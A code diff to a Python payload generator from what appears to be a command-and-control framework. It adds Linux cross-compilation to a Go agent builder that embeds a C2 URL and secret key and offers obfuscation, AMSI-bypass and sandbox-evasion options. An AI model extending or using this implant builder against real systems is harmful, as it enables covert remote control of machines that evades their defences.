@@ -77,7 +77,7 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False):
+    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows'):
         print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
@@ -146,7 +146,7 @@ class PayloadGenerator:
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
@@ -370,7 +370,7 @@ class PayloadGenerator:
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows'):
         import subprocess
         import os
         import tempfile
@@ -543,7 +543,10 @@ class PayloadGenerator:
 
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         safe_listener_name = "go_agent"  # We'll use a generic name since we don't have listener_name here
-        exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
+        if platform.lower() == 'linux':
+            exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}"
+        else:
+            exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
         final_exe_path = os.path.join(logs_dir, exe_filename)
 
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -570,16 +573,25 @@ class PayloadGenerator:
             if result.returncode != 0:
                 raise Exception(f"Failed to get Go dependencies: {result.stderr}")
 
-            temp_exe_path = os.path.join(temp_dir, 'agent.exe')
+            if platform.lower() == 'linux':
+                output_filename = 'agent'
+                temp_exe_path = os.path.join(temp_dir, 'agent')
+            else:
+                output_filename = 'agent.exe'
+                temp_exe_path = os.path.join(temp_dir, 'agent.exe')
+
             try:
                 env = go_env.copy()  # Use the same Go cache environment
-                env['GOOS'] = 'windows'
+                if platform.lower() == 'linux':
+                    env['GOOS'] = 'linux'
+                else:
+                    env['GOOS'] = 'windows'
                 env['GOARCH'] = 'amd64'
 
                 result = subprocess.run([
                     'go', 'build',
                     '-ldflags', '-s -w',  # Strip symbols but keep console visible for debugging
-                    '-o', 'agent.exe',
+                    '-o', output_filename,
                     '.'
                 ], env=env, capture_output=True, text=True, cwd=temp_dir)
 
